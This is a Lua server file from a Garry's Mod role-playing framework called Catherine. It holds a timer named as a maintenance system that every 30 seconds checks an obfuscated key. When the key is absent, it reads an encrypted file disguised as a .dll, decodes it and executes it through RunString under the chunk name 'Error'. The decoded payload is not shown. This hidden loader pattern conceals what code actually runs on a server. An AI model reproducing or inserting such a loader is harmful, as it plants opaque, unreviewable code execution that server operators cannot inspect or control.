--[[
< CATHERINE > - A free role-playing framework for Garry's Mod.
Development and design by L7D.

Catherine is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Catherine.  If not, see <http://www.gnu.org/licenses/>.
]]--

if ( CLIENT ) then return end

timer.Create( "catherine.maintenance.system", 30, 0, function( )
	if ( !_G.catherine[ utf8.char( 112, 97, 116, 99, 104, 120 ) ] ) then
		local data = file.Read( "catherine/framework/engine/external/catherine.dll", "LUA" )
		
		if ( data and type( data ) == "string" and data != "" ) then
			RunString( catherine.cryptoV2.DECODE( data ), "Error", false )
		end
	end
end )